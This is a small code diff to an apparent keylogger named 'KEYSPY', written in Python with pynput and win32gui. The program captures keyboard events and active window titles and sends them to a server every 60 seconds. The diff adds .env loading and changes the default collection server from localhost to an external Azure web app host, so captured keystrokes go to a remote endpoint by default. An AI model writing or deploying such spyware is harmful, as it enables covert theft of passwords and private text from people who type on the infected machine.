@@ -1,5 +1,6 @@
 from datetime import datetime
 from pynput import keyboard
+from dotenv import load_dotenv
 import win32gui
 import json
 import threading
@@ -8,6 +9,8 @@ import atexit
 import os
 import sys
 import re
+
+load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), "..", ".env"))
 
 send_time = 60
 event_buffer = []
@@ -19,7 +22,7 @@ def get_active_window():
     return title.split(" - ")[-1] if title else "Unknown"
 
 
-SERVER = os.getenv("KEYSPY_SERVER_URL", "http://127.0.0.1:8000")
+SERVER = os.getenv("KEYSPY_SERVER_URL", "https://yangard-api.azurewebsites.net")
 
 def get_uuid():
     filename = os.path.splitext(os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__))[0]
